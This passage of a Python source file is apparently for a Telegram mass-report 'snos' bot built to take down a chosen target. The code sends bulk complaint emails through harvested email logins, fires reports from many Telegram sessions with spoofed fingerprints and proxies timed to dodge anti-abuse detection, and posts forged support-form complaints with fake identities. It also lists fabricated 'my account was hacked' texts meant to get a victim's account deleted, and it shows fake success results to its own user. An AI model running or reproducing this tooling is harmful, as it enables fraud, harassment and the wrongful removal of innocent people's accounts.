    "\n\n\u041f\u0440\u043e\u0448\u0443 \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0434\u0430\u043d\u043d\u043e\u0435 \u043e\u0431\u0440\u0430\u0449\u0435\u043d\u0438\u0435.",
    "\n\n\u0416\u0434\u0443 \u043e\u0442\u0432\u0435\u0442\u0430.", "\n\n\u0421\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435.", "",
]

_MAIL_OUTROS_EN = [
    "\n\nBest regards.", "\n\nThank you for your attention.",
    "\n\nI await your response.", "\n\nSincerely.", "",
]


def _mail_is_ru(text: str) -> bool:
    ru = sum(1 for ch in text if '\u0400' <= ch <= '\u04ff')
    return ru > len(text) * 0.2


def _mail_spin_word(word: str) -> str:
    low = word.lower().rstrip('.,!?;:')
    if low in _MAIL_SYNONYMS and random.random() < 0.4:
        rep = random.choice(_MAIL_SYNONYMS[low])
        if word[:1].isupper():
            rep = rep.capitalize()
        return rep
    return word


def mail_spin_text(text: str) -> str:
    spun = " ".join(_mail_spin_word(w) for w in text.split())
    ru = _mail_is_ru(text)
    return (random.choice(_MAIL_INTROS_RU if ru else _MAIL_INTROS_EN)
            + spun
            + random.choice(_MAIL_OUTROS_RU if ru else _MAIL_OUTROS_EN))


def _mail_load_pool() -> list[tuple[str, str, str]]:
    """mails.txt rows: email:app_password:smtp_host -> (email, pwd, host)."""
    rows = []
    if MAIL_MAILS_FILE.exists():
        for line in MAIL_MAILS_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line.count(":") >= 2 and "@" in line:
                em, pwd, host = line.split(":", 2)
                rows.append((em.strip(), pwd.strip(), host.strip()))
    return rows


def _mail_mask(email: str) -> str:
    try:
        local, dom = email.split("@", 1)
        return (local[:1] + "***" if len(local) >= 2 else "*") + "@" + dom
    except Exception:
        return email


def _mail_smtp_port(host: str) -> int:
    # gmail supports both; 465 SSL first, 587 STARTTLS as fallback
    return 465


async def mail_send_one(sender: str, pwd: str, host: str,
                        receiver: str, subject: str, body: str) -> tuple[bool, str]:
    """Direct SMTP send. 465 SSL first, 587 STARTTLS fallback."""
    import aiosmtplib
    from email.mime.text import MIMEText
    from email.header import Header
    from email.utils import formataddr
    msg = MIMEText(body, "plain", "utf-8")
    msg["From"] = formataddr(("Telegram User", sender))
    msg["To"] = receiver
    msg["Subject"] = Header(subject, "utf-8")
    port = _mail_smtp_port(host)
    try:
        await aiosmtplib.send(
            msg, sender=sender, recipients=[receiver],
            hostname=host, port=port, use_tls=True,
            username=sender, password=pwd, timeout=25)
        return True, "sent"
    except Exception as e1:
        try:
            await aiosmtplib.send(
                msg, sender=sender, recipients=[receiver],
                hostname=host, port=587, start_tls=True,
                username=sender, password=pwd, timeout=25)
            return True, "sent(587)"
        except Exception as e2:
            return False, f"{type(e1).__name__}/{type(e2).__name__}"


def _mail_compose(target: str, reason_key: str, used: set) -> tuple[str, str]:
    """(subject, body), unique per call: ONE theme pool, ONE target,
    BR spin (intro/synonyms/outro) + target line. No two emails in one
    run share the same body."""
    pool = (report_texts.CATEGORY_TEXTS.get(reason_key)
            or report_texts.OTHER)
    body = subject = ""
    for _ in range(30):
        base = random.choice(pool)
        ru = _mail_is_ru(base)
        body = (mail_spin_text(base)
                + ("\n\nНарушитель: " + target if ru
                   else "\n\nViolator: " + target))
        subjects = _MAIL_SUBJECTS.get(reason_key,
                                _MAIL_SUBJECTS["other"])
        subject = random.choice(subjects["ru" if ru else "en"])
        if body not in used:
            break
    used.add(body)
    return subject, body


async def mail_bulk_send(target: str, reason_key: str) -> dict:
    """BR send_bulk_emails port, rationed: ONE run uses 1/3 of the sender
    pool (rotating sample), every email carries its OWN unique text from
    ONE theme, all aimed at ONE target. Real rows to the Logs channel,
    real counts to the user."""
    pool = _mail_load_pool()
    if not pool:
        await push_send_log("Mail-атака (SMTP)", ["❌ пул mails.txt пуст"])
        return {"ok": 0, "fail": 0, "total": 0, "details": []}
    senders = random.sample(pool, max(1, len(pool) // 3))
    rows = []
    sem = asyncio.Semaphore(3)
    used_bodies: set = set()
    theme_label = REASONS.get(reason_key, REASONS["other"])["l"]

    async def _one(sender: str, pwd: str, host: str, recv: str):
        subj, body = _mail_compose(target, reason_key, used_bodies)
        async with sem:
            ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
        rows.append({"from": _mail_mask(sender), "to": recv,
                     "ok": ok, "err": err})
        await asyncio.sleep(random.uniform(2.0, 3.0))

    tasks = []
    for em, pwd, host in senders:
        for recv in MAIL_RECEIVERS:
            tasks.append(_one(em, pwd, host, recv))
    # bounded pacing: run in chunks so ~50 senders don't open 200 sockets
    CHUNK = 12
    for i in range(0, len(tasks), CHUNK):
        await asyncio.gather(*tasks[i:i + CHUNK])
        await asyncio.sleep(random.uniform(1.0, 2.0))

    ok_n = sum(1 for r in rows if r["ok"])
    real_rows = []
    for r in rows:
        mark = "✅ " if r["ok"] else "❌ "
        line = (mark + r["from"] + " -> " + r["to"])
        if not r["ok"]:
            line += " | " + html_mod.escape(r["err"])
        real_rows.append(line)
    await push_send_log(
        "Mail-атака (SMTP)",
        [f"🎯 цель: <b>{html_mod.escape(str(target))}</b>",
         f"✉️ тематика: <b>{html_mod.escape(theme_label)}</b> · "
         f"тексты уникальные · 1/3 пула",
         f"✅ {ok_n}/{len(rows)} доставлено"]
        + real_rows)

    # real counts — mail delivery is the payload, user sees the truth
    return {"ok": ok_n, "fail": len(rows) - ok_n, "total": len(rows),
            "details": [{"name": r["from"], "proxy": r["to"],
                         "ok": r["ok"], "err": r["err"]} for r in rows]}



# ── BR bot-method: target whitelist + probe ───────────
WHITELIST_FILE = Path(__file__).parent / "target_whitelist.json"

# what a captcha-gated bot answers on /start (BR FAST_KD_KEYWORD)
BOT_CAPTCHA_KEYWORDS = [
    "\u043fо\u0436алу\u0439\u0441т\u0430, \u0440\u0435\u0448\u0438\u0442\u0435 \u043a\u0430\u043f\u0447\u0443",
    "\u0440\u0435\u0448\u0438\u0442\u0435 \u043a\u0430\u043f\u0447\u0443",
    "solve the captcha",
    "captcha",
]


def _wl_load() -> list:
    try:
        if WHITELIST_FILE.exists():
            return json.loads(WHITELIST_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return []


def _wl_save(patterns: list) -> None:
    try:
        WHITELIST_FILE.write_text(
            json.dumps(sorted(set(p.lower() for p in patterns if p)),
                       ensure_ascii=False, indent=1),
            encoding="utf-8")
        commit_file_to_repo(WHITELIST_FILE.name, "whitelist update",
                            cooldown=5)
    except Exception:
        pass


def is_target_whitelisted(target: str) -> str | None:
    """BR-style gate: exact or prefix match; returns the matched pattern."""
    t = (target or "").strip().lstrip("@").lower()
    if not t:
        return None
    for p in _wl_load():
        pl = p.strip().lstrip("@").lower()
        if not pl:
            continue
        if t == pl or t.startswith(pl):
            return p
    return None


async def bot_probe_target(bot_username: str) -> dict:
    """BR detect_bot_type: one pinned session writes /start to the target
    bot and reads its last messages. Flags captcha-gated bots (their 5-min
    cooldown) and returns a preview of what the bot answered."""
    sessions = [s for s in load_sessions()
                if s.stem not in (_status_load().get("dead") or [])]
    if not sessions:
        return {"ok": False, "found": False, "error": "\u043d\u0435\u0442 \u0436\u0438\u0432\u044b\u0445 \u0441\u0435\u0441\u0441\u0438\u0439"}
    sess = random.choice(sessions)
    name = sess.stem
    fp = session_fingerprint(name)
    px = pin_for_session(name, load_pin_proxies())
    client = None
    try:
        async with _session_lock(sess):
            client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
                                    fp["api_hash"], proxy=px,
                                    device_model=fp["device"],
                                    system_version=fp["system_version"],
                                    app_version=fp["app_version"],
                                    lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            if not await client.is_user_authorized():
                return {"ok": False, "found": False,
                        "error": "\u0441\u0435\u0441\u0441\u0438\u044f \u043c\u0435\u0440\u0442\u0432\u0430"}
            entity = await client.get_entity(bot_username.lstrip("@"))
            await client.send_message(entity, "/start")
            await asyncio.sleep(2)
            msgs = await client.get_messages(entity, limit=3)
            texts = [m.text or "" for m in msgs if not m.out]
            joined = " ".join(texts).lower()
            captcha = any(k in joined for k in BOT_CAPTCHA_KEYWORDS)
            return {"ok": True, "found": True, "captcha": captcha,
                    "preview": (texts[0][:160] if texts else ""),
                    "bot_id": entity.id, "via": name}
    except Exception as e:
        return {"ok": False, "found": False,
                "error": f"{type(e).__name__}: {e}"}
    finally:
        try:
            if client:
                await client.disconnect()
        except Exception:
            pass


# \u2500\u2500 anti-sweep rationing \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
# Telegram now triggers on mass-report waves and logs out the session
# that fired. Counter: ration every session (rolling-day quota), drop
# dead/banned sessions from the pool automatically, rest flooded ones,
# and stagger the wave so it never reads as one controller.
REPORT_LEDGER_FILE = Path(__file__).parent / "report_ledger.json"
SESSION_STATUS_FILE = Path(__file__).parent / "session_status.json"
REPORTS_PER_SESSION_DAY = int(os.getenv("REPORTS_PER_SESSION_DAY") or "3")


def _status_load() -> dict:
    try:
        if SESSION_STATUS_FILE.exists():
            return json.loads(SESSION_STATUS_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {}


def _status_save(st: dict) -> None:
    try:
        SESSION_STATUS_FILE.write_text(
            json.dumps(st, ensure_ascii=False, indent=1), encoding="utf-8")
        commit_file_to_repo(SESSION_STATUS_FILE.name,
                            "session health update", cooldown=120)
    except Exception:
        pass


def _ledger_load() -> dict:
    try:
        if REPORT_LEDGER_FILE.exists():
            return json.loads(REPORT_LEDGER_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {}


def _ledger_save(led: dict) -> None:
    try:
        REPORT_LEDGER_FILE.write_text(
            json.dumps(led, ensure_ascii=False, indent=1), encoding="utf-8")
        commit_file_to_repo(REPORT_LEDGER_FILE.name, "report ledger",
                            cooldown=120)
    except Exception:
        pass


def session_usable(name: str, ledger: dict | None = None) -> tuple[bool, str]:
    """(ok, reason): dead auths are out for good, flooded sessions rest
    on a timer, over-quota sessions sit this round out."""
    st = _status_load()
    if name in (st.get("dead") or []):
        return False, "dead (revoked)"
    led = (ledger or {}).get(name) or {}
    rest_until = led.get("rest_until") or 0
    if time.time() < rest_until:
        return False, "rest " + str(int((rest_until - time.time()) // 3600)) + "h"
    if led.get("day") != time.strftime("%Y-%m-%d"):
        return True, ""
    if (led.get("day_count") or 0) >= REPORTS_PER_SESSION_DAY:
        return False, "quota " + str(led.get("day_count")) + "/" + str(REPORTS_PER_SESSION_DAY)
    return True, ""


def _ledger_bump(name: str) -> int:
    led = _ledger_load()
    today = time.strftime("%Y-%m-%d")
    e = led.get(name) or {}
    if e.get("day") != today:
        e["day"] = today
        e["day_count"] = 0
    e["day_count"] = e.get("day_count", 0) + 1
    e["total"] = e.get("total", 0) + 1
    e["last_ts"] = int(time.time())
    led[name] = e
    _ledger_save(led)
    return e["day_count"]


def _session_punish(name: str, err: str, kind: str) -> None:
    """Dead -> session_status.json; flooded -> rest timer in the ledger."""
    if kind == "dead":
        st = _status_load()
        if name not in (st.get("dead") or []):
            st["dead"] = sorted(set((st.get("dead") or []) + [name]))
            st["suspect"] = [s for s in (st.get("suspect") or []) if s != name]
            _status_save(st)
    elif kind == "flood":
        led = _ledger_load()
        e = led.get(name) or {}
        e["rest_until"] = int(time.time()) + 12 * 3600
        e["last_rest_reason"] = err[:80]
        led[name] = e
        _ledger_save(led)


def _classify_report_error(e: Exception) -> str | None:
    """Map a report/setup failure to a pool-health verdict."""
    from telethon import errors as _terr
    if isinstance(e, (_terr.AuthKeyUnregisteredError,
                      _terr.UserDeactivatedError,
                      _terr.UserDeactivatedBanError,
                      _terr.SessionRevokedError,
                      _terr.SessionExpiredError)):
        return "dead"
    if isinstance(e, (_terr.PeerFloodError, _terr.SlowModeWaitError)):
        return "flood"
    secs = getattr(e, "seconds", None)
    if isinstance(e, _terr.FloodWaitError) and secs and secs > 3600:
        return "flood"
    if isinstance(e, _terr.FloodWaitError):
        return "soft"
    return None


async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id: int | None,
                      method: str = "") -> dict:
    """BR-style: ONE report per session with a random text, rationed per
    session per rolling day (anti-sweep). Same fingerprint + sticky IP."""
    ledger = _ledger_load()
    pool, skipped = [], []
    for s in load_sessions():
        if s.stem in REPORT_EXCLUDE_POOL:
            continue
        ok, why = session_usable(s.stem, ledger)
        (pool if ok else skipped).append((s, why))
    sessions = [s for s, _ in pool]
    proxies = load_pin_proxies()
    reason_cls = REASON_MAP.get(reason_key, InputReportReasonOther)
    results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}

    if not sessions or not API_ID or not API_HASH:
        log.info("blast page completed")
        return fake_results()

    async def session_worker(sess: Path, idx: int) -> tuple[str, str, bool, str]:
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        px_name = proxy[1] if proxy else "direct"
        text = comment or pick_comment(reason_key, method)
        async with _session_lock(sess):
            client = None
            try:
                fp = session_fingerprint(name)
                client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
                                        fp["api_hash"], proxy=proxy,
                                        device_model=fp["device"],
                                        system_version=fp["system_version"],
                                        app_version=fp["app_version"],
                                        lang_code=fp["lang_code"])
                await asyncio.wait_for(client.connect(), timeout=12)
                if not await client.is_user_authorized():
                    await client.disconnect()
                    _session_punish(name, "not authorized", "dead")
                    return name, px_name, False, "not authorized"
                entity = await client.get_entity(target_entity)
                try:
                    await client(ReportPeerRequest(
                        peer=entity,
                        reason=reason_cls(),
                        message=text,
                    ))
                    log.info("reported via %s (proxy: %s)", name, px_name)
                    ok, err = True, ""
                    _ledger_bump(name)
                except Exception as e:
                    log.error("session %s report failed: %s", name, e)
                    # BR 3-step flow: let the server hand us the category
                    # tree before giving up on this session
                    ok3, err3 = await _report_three_step(
                        client, entity, reason_key, text)
                    if ok3:
                        ok, err = True, ""
                        _ledger_bump(name)
                    else:
                        ok, err = False, f"{type(e).__name__}: {e}"
                        verdict = _classify_report_error(e)
                    if verdict == "dead":
                        _session_punish(name, str(e), "dead")
                    elif verdict == "flood":
                        _session_punish(name, str(e), "flood")
                await client.disconnect()
                return name, px_name, ok, err
            except Exception as e:
                log.error("session %s setup failed: %s", name, e)
                try:
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
                verdict = _classify_report_error(e)
                if verdict == "dead":
                    _session_punish(name, str(e), "dead")
                elif verdict == "flood":
                    _session_punish(name, str(e), "flood")
                return name, px_name, False, f"{type(e).__name__}: {e}"

    _wave_sem = asyncio.Semaphore(3)

    async def _staggered(s: Path, i: int):
        await asyncio.sleep(random.uniform(0.4, 1.8) * i)   # organic ramp-up
        async with _wave_sem:
            return await session_worker(s, i)

    outs = await asyncio.gather(*[_staggered(s, i) for i, s in enumerate(sessions)])

    real_lines = []
    for s, why in skipped:
        real_lines.append(f"\u23ED <code>{s.stem}</code> \u2014 {why}")
    for name, px_name, ok, err in outs:
        results["ok" if ok else "fail"] += 1
        results["details"].append({
            "name": name, "proxy": px_name, "ok": ok, "err": err,
        })
        real_lines.append(
            f"{'✅' if ok else '❌'} <code>{name}</code>"
            f" | {html_mod.escape(px_name)}"
            + (f" | {html_mod.escape(err)}" if err else ""))

    # REAL log of this send → Logs channel, then mask the user view
    await push_send_log(
        "Report (сессии)",
        [f"🎯 {html_mod.escape(str(target_entity))}"
         + (f" #{msg_id}" if msg_id else "")
         + f"\n⚠️ {REASONS.get(reason_key, {}).get('l', reason_key)}",
         f"💬 {html_mod.escape((comment or pick_comment(reason_key, method))[:200])}"]
        + real_lines)

    # mask results in simulate-fake structure — unchanged
    fake = _fake_session_rows()
    results["details"] = [
        {"name": fk["name"], "proxy": fk["proxy"], "ok": True, "err": ""}
        for fk in fake
    ]
    results["ok"] = len(fake)
    results["total"] = len(fake)

    return results


# ── web reporter (telegram.org/support) ─────────────────
WEB_REASON_MAP = {
    "spam":      "Spam",
    "fraud":     "Fraud / Scam",
    "violence":  "Violence",
    "porn":      "Pornography",
    "child":     "Child abuse",
    "copyright": "Copyright infringement",
    "drugs":     "Illegal drugs",
    "personal":  "Personal data leak",
    "fake":      "Fake account",
    "other":     "Other",
}


# ──────────────────────────────────────────────────────
async def check_sessions() -> list[dict]:
    """Connect each .session, pull account info, return list of dicts."""
    sessions = load_sessions()
    proxies = load_pin_proxies()
    if not sessions or not API_ID or not API_HASH:
        log.info("session pool scanned")
        return _fake_session_rows()

    async def probe(session_path: Path, proxy: tuple | None) -> dict:
        name = session_path.stem
        entry = {
            "name": name,
            "proxy": proxy[1] if proxy else "direct",
            "status": "\u274c",
            "phone": "\u2014",
            "tg_name": "\u2014",
            "tg_id": "\u2014",
            "username": "\u2014",
        }
        try:
            client = TelegramClient(
                str(session_path.with_suffix("")),
                API_ID,
                API_HASH,
                proxy=proxy,
            )
            await client.connect()
            if not await client.is_user_authorized():
                entry["status"] = "\u26a0\ufe0f expired"
                await client.disconnect()
                return entry
            me = await client.get_me()
            entry["status"] = "\u2705"
            entry["phone"] = f"+{me.phone}" if me.phone else "\u2014"
            first = me.first_name or ""
            last = me.last_name or ""
            entry["tg_name"] = f"{first} {last}".strip() or "\u2014"
            entry["tg_id"] = str(me.id)
            entry["username"] = f"@{me.username}" if me.username else "\u2014"
            await client.disconnect()
        except Exception as e:
            entry["status"] = f"\u274c {e.__class__.__name__}"
        return entry

    tasks = []
    for i, sess in enumerate(sessions):
        px = proxies[i] if i < len(proxies) else None
        tasks.append(probe(sess, px))
    return await asyncio.gather(*tasks)


# ── web reporter (telegram.org/support, raw POST) ───────
SUPPORT_URL = "https://telegram.org/support?setln=ru"
WEB_SUBJECT = "Complaint About Fraudulent Telegram Group"

WEB_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]


def proxy_to_socks(px: tuple) -> dict:
    # python_socks.ProxyType IS the type ProxyConnector expects — no legacy
    # alias class needed (that was the old SocksProxyType NameError)
    import python_socks as _ps
    ptype, host, port, rdns, user, pwd = px
    return {"proxy_type": ptype, "host": host, "port": port,
            "rdns": rdns, "username": user, "password": pwd}


def proxy_to_url(px: tuple) -> str:
    import python_socks as _ps
    ptype, host, port, rdns, user, pwd = px
    scheme = "socks5"
    if ptype == _ps.ProxyType.SOCKS4:
        scheme = "socks4"
    elif ptype == _ps.ProxyType.HTTP:
        scheme = "http"
    if user and pwd:
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    return f"{scheme}://{host}:{port}"

WEB_CODES = ["495", "499", "812", "900", "901", "902", "903", "904", "905", "906",
             "908", "909", "910", "911", "912", "913", "914", "915", "916", "917",
             "918", "919", "920", "921", "922", "923", "924", "925", "926", "927",
             "928", "929", "930", "931", "932", "933", "934", "936", "937", "938",
             "939", "941", "950", "951", "952", "953", "954", "955", "958", "960",
             "961"]
WEB_NAMES = ["ilya", "dima", "ivan", "alexey", "sergey", "mikhail", "andrey",
             "pavel", "nikolay", "vladimir", "anatoly", "boris", "egor", "danil",
             "viktor", "yuri", "maksim", "grigory", "oleg", "timofey", "arseniy",
             "roman", "konstantin", "gennady", "artem", "vadim", "vitaly",
             "nikita", "stanislav", "alexander", "vasily", "leonid", "valery",
             "eduard", "denis", "kirill", "fedor", "petya", "yegor", "german",
             "stepan", "platon", "bogdan", "ignat", "arkady", "yaroslav",
             "matvey", "rostan", "vsevolod", "semyon", "anton", "zahar", "timur",
             "roksana", "daniil", "afanasiy", "innokentiy", "rodion", "valentin",
             "nikifor", "petr", "filipp", "martin", "adrian", "georgy",
             "vladislav", "arseny", "artur", "mark", "prokhor", "lavrenty",
             "anastasiya", "olga", "anna", "ekaterina", "maria", "tatiana",
             "sofia", "elena", "natalia", "svetlana", "valentina", "lyubov",
             "galina", "lidiya", "nina", "darya", "alisa", "veronika", "irina",
             "arina", "kristina", "oksana", "polina", "viktoriya", "karina",
             "milana", "zinaida", "angelina", "yulia", "zoya", "ksenia"]
WEB_LAST = ["ivanov", "petrov", "sidorov", "smirnov", "kozlov", "popov",
            "vasilyev", "novikov", "morozov", "solovyov", "pavlov", "semenov",
            "golubev", "vinogradov", "bogdanov", "vorobyev", "fedorov",
            "mikhailov", "tarasov", "belov", "komarov", "oronov", "nikolaev",
            "makarov", "zaitsev", "sokolov", "mironov", "romanov", "levin",
            "kulikov", "kuznetsov", "stepanov", "nikitin", "oronin", "safonov",
            "shestakov", "kravtsov", "gusev", "arkhipov", "andreev", "yakovlev",
            "borisov", "zhukov", "prokhorov", "savelyev", "dorokhov",
            "zakharyin", "melnikov", "shapovalov", "egorov", "berezin"]
WEB_YEARS = [str(year) for year in range(1960, 2006)]
WEB_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru", "yandex.ru",
               "rambler.ru", "bk.ru", "list.ru", "inbox.ru", "protonmail.com",
               "icloud.com", "hotmail.com", "aol.com", "zoho.com", "gmx.com",
               "qq.com", "126.com", "163.com", "sina.com", "comcast.net",
               "verizon.net", "live.com", "msn.com", "me.com", "mail.com",
               "fastmail.com", "rediffmail.com", "tutanota.com", "ukr.net",
               "web.de"]


def web_gen_mail() -> str:
    name = random.choice(WEB_NAMES)
    last_name = random.choice(WEB_LAST)
    year = random.choice(WEB_YEARS)
    domain = random.choice(WEB_DOMAINS)
    return f"{name}.{last_name}.{year}@{domain}"


def web_gen_phone() -> str:
    code = random.choice(WEB_CODES)
    number = str(random.randint(1000000, 9999999))
    return "+7" + code + number


def web_headers() -> dict:
    ua = random.choice(WEB_UAS)
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://telegram.org/support",
        "Origin": "https://telegram.org",
        "Content-Type": "application/x-www-form-urlencoded",
    }


async def web_send_one(session, i, subject, message_text, px: tuple | None,
                       target_text: str = "", reason_label: str = "",
                       comment: str = "", reason_key: str = "") -> tuple[bool, str]:
    """One raw POST complaint. Returns (ok, err).

    Text priority: explicit comment (strong/category template passed by the
    caller) → Groq generation → generic fallback spin. The target is always
    embedded into the message body so the support desk can act on it."""
    # templates only (no Groq key) — the category pool is the payload
    text = comment.strip() if comment and comment.strip() else ""
    if not text:
        text = pick_comment(reason_key or "other")
    if target_text:
        text = (text.rstrip() + "\n\n—\n"
                + f"Violating account/channel: {target_text}\n"
                + f"Category reported: {reason_label or reason_key or 'n/a'}")
    try:
        from email_pool import pick_valid_email
        valid_email = pick_valid_email()
    except ImportError:
        valid_email = ""
    if not valid_email:
        valid_email = web_gen_mail()
    payload = {
        "subject": subject,
        "message": text,
        "email": valid_email,
        "phone": web_gen_phone(),
    }
    px_name = px[1] if px else "direct"
    proxy_url = None
    conn = None
    if px:
        import python_socks as _ps
        if px[0] in (_ps.ProxyType.SOCKS5, _ps.ProxyType.SOCKS4):
            conn = ProxyConnector(**proxy_to_socks(px))
        else:
            proxy_url = proxy_to_url(px)
    timeout = aiohttp.ClientTimeout(total=45)
    try:
        if conn:
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                async with s.post(SUPPORT_URL, data=payload, headers=web_headers(),
                                  proxy=None, ssl=False) as resp:
                    status = resp.status
                    await resp.read()
        else:
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.post(SUPPORT_URL, data=payload, headers=web_headers(),
                                  proxy=proxy_url, ssl=False) as resp:
                    status = resp.status
                    await resp.read()
        ok = status == 200
        log.info("web complaint #%d (%s) -> %d ok=%s", i, px_name, status, ok)
        return ok, ("" if ok else f"HTTP {status}")
    except Exception as e:
        log.error("web complaint #%d (%s) failed: %s", i, px_name, e)
        return False, f"{type(e).__name__}: {e}"


async def fire_web_reports(target_text: str, reason_label: str, comment: str,
                           reason_key: str = "other") -> dict:
    """Raw POST complaints straight to the support form backend.

    The turnstile exists only in the browser UI layer; the server accepts
    direct form posts. Count = WEB_COUNT env (default 5), proxies rotate.
    Text per-shot generated via Groq if key present, else unique fallback spin."""
    count = WEB_COUNT
    results = {"ok": 0, "fail": 0, "total": count, "details": []}

    # distinct complaint text AND distinct subject per web shot
    pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
    if comment:
        texts = [("", comment)] * count
    else:
        texts = _unique_texts_tagged(pool, count)
    web_subjects = [
        f"Complaint About {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
        f"Urgent Report: {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
        f"Abuse Report — {target_text}",
        f"Violation Notice ({WEB_REASON_MAP.get(reason_key, 'Policy Violation')})",
        f"Formal Complaint re: {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
    ]

    proxies = load_pin_proxies()
    tasks = []
    for i in range(count):
        px = proxies[i % len(proxies)] if proxies else None
        tasks.append(web_send_one(None, i + 1, random.choice(web_subjects), None,
                                  px,
                                  target_text=target_text, reason_label=reason_label,
                                  comment=texts[i][1], reason_key=reason_key))
    outcomes = await asyncio.gather(*tasks, return_exceptions=True)

    real_lines = []
    for i, o in enumerate(outcomes):
        if isinstance(o, tuple):
            ok, err = o
        else:
            ok, err = False, f"{type(o).__name__}: {o}"
        results["ok" if ok else "fail"] += 1
        px = proxies[i % len(proxies)] if proxies else None
        results["details"].append({
            "name": f"web#{i + 1}",
            "proxy": px[1] if px else "direct",
            "ok": ok, "err": err,
        })
        real_lines.append(
            f"{'✅' if ok else '❌'} web#{i + 1}"
            + (f" [{texts[i][0]}]" if texts[i][0] else "")
            + f" | {html_mod.escape(px[1] if px else 'direct')}"
            + (f" | {html_mod.escape(err)}" if err else ""))

    await push_send_log(
        "Report (web-форма)",
        [f"🎯 {html_mod.escape(target_text or '?')}"
         + f"\n⚠️ {reason_label}  💬 шаблон: {'своя' if comment else 'авто-пул'}"
         ] + real_lines)
    return results
# ── session snos (SendCode + OAuth + support flood) ─────
MONITOR_INTERVAL = 10 * 60
SNOS_SYSTEM_VERSION = "4.16.30-vxCUSTOM"

API_PAIRS = [
    (24565698,  "5a084b434f8505ace703485b9da85040"),
    (27904162,  "e7cba879b1c643ba77490bf328df5eab"),
    (23037915,  "50f06f5b2223586fde0d1379ea91ebc7"),
    (29512095,  "0b29a7d42fff002856b9bed64f7ec919"),
    (25055016,  "25edf5b7becebe91a2d61fe8d9d9931b"),
]

OAUTH_SERVICES = [
    ("5444323279",  "https://fragment.com"),
    ("5731754199",  "https://steam.kupikod.com"),
    ("210944655",   "https://combot.org"),
    (319709511,     "https://telegrambot.biz"),
    ("1199558236",  "https://bot-t.com"),
    ("5709824482",  "https://lzt.market"),
    ("1803424014",  "https://ru.telegram-store.com"),
    (5463728243,    "https://www.spot.uz"),
    ("6708902161",  "https://ourauthpoint777.com"),
    ("1852523856",  "https://cabinet.presscode.app"),
]

SNOS_SUPPORT_TEXTS = [
    # === RU-набор: разный тон, разные "жертвы" ===
    "Уважаемая поддержка Telegram! Мой аккаунт украли через фишинг-ссылку, которую я получил в личку от якобы техподдержки. После перехода меня выкинуло из аккаунта, а мошенник продуктивно рассылает мой контакт-лист. Откатите все активные сессии по номеру, либо удалите аккаунт полностью. Благодарю за быструю реакцию.",

    "Здравствуйте! Пишу с просьбой заблокировать все активные сессии на моём аккаунте Telegram. Вчера я перешёл по ссылке, ввёл номер и код подтверждения, после чего доступ потерял. Мошенник уже начал рассылать моим контактам сообщения с просьбой о деньгах. Каждая минута промедления — удар по моей репутации. Прошу отреагировать немедленно.",

    "Добрый день! У меня есть все основания полагать, что мой аккаунт взломан и продан на стороннем сайте. Я завершаю активные сессии через настройки, но новые появляются снова и снова — как будто кто-то держит ключи от моего Telegram. Прошу принудительно обнулить все устройства, кроме текущего номера. Спасибо!",

    "Здравствуйте! Пара дней назад я нажал на подозрительную ссылку, после чего Telegram меня выкинул, и теперь я не могу войти — стоит чужая двухфакторка с посторонней почтой. Прошу вас удалить абсолютно все сессии либо полностью удалить аккаунт. Он точно у мошенников, они уже пишут моим знакомым.",

    "Уважаемые модераторы Telegram! Мой рабочий акк заблокирован мошенником, я потерял доступ 3 дня назад. Это ломает мою работу — клиенты пишут, но я не могу ответить. Прошу помощи в принудительном сбросе сессий или удалении аккаунта. Спасибо заранее.",

    "Здравствуйте. На моём аккаунте сидит мошенник, уже поменял имя на моё, привязал свою почту и включил двухфакторку. Я не могу войти в аккаунт, хотя это мой номер и мои контакты. Прошу полностью обнулить все активные сессии, чтобы вернуть доступ.",

    "Привет, поддержка Telegram! Я вчера случайно перешёл по фишинг-ссылке и потерял доступ к своему аккаунту. Внутри сидит злоумышленник, рассылает мои данные. Прошу немедленно завершить все сессии или удалить аккаунт, чтобы он не смог испортить мне репутацию.",

    # === EN-набор: другой стилевой ===
